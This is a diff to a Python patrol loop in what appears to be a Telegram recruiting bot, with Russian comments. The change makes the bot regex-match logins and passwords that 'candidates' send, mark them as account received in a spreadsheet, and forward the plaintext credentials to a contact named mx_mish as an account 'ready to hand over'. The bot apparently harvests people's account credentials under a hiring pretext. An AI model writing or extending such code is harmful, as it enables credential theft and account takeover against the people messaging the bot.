@@ -1183,9 +1183,46 @@ async def patrol_loop():
                         continue
 
                     new_texts.reverse()
+                    # РЕГРЕССИЯ (найдена и починена после T1): в отличие от handler()
+                    # и от hr-bot's patrol_loop, эта ветка вообще не проверяла
+                    # CREDS_PATTERN - кредсы, подхваченные патрулём (а не живым
+                    # хендлером - например бот был недоступен в момент сообщения),
+                    # просто сохранялись как обычный текст и никогда не уходили
+                    # коллеге mx_mish - кандидат зависал без выдачи аккаунта.
+                    has_creds = False
                     for t in new_texts:
-                        add_message(user_id, "candidate", t)
+                        creds_match = CREDS_PATTERN.search(t)
+                        if creds_match:
+                            login, password = creds_match.group(1), creds_match.group(2)
+                            creds_str = f"{login} / {password}"
+                            add_message(user_id, "candidate", "[получены учётные данные аккаунта]")
+                            update_candidate(user_id, status="АККАУНТ_ПОЛУЧЕН")
+                            try:
+                                sh = sheets_module._get_sheet()
+                                ws = sh.sheet1
+                                cell = ws.find(f"@{username}" if username else "")
+                                if cell:
+                                    ws.update_cell(cell.row, 8, "АККАУНТ_ПОЛУЧЕН")
+                            except Exception as e:
+                                logging.error(f"[patrol] Sheets creds error: {e}")
+                            try:
+                                confirm = "Отлично! Данные получил, передам коллегам для настройки аккаунта."
+                                await _send_message_safe(user_id, confirm)
+                                add_message(user_id, "bot", confirm)
+                            except Exception:
+                                pass
+                            try:
+                                await _send_message_safe("mx_mish", f"🔑 Готов отдать аккаунт: {name} (@{username})\nЛогин/пароль: {creds_str}")
+                            except Exception as e:
+                                logging.error(f"[patrol] Notify mx_mish error: {e}")
+                            logging.info(f"[patrol] Кредсы от {name}: {login} / ***")
+                            has_creds = True
+                        else:
+                            add_message(user_id, "candidate", t)
                     update_candidate(user_id, reminder_count=0)
+
+                    if has_creds:
+                        continue
 
                     logging.info(f"[patrol] Найдено {len(new_texts)} новых от {name} (@{username})")
 
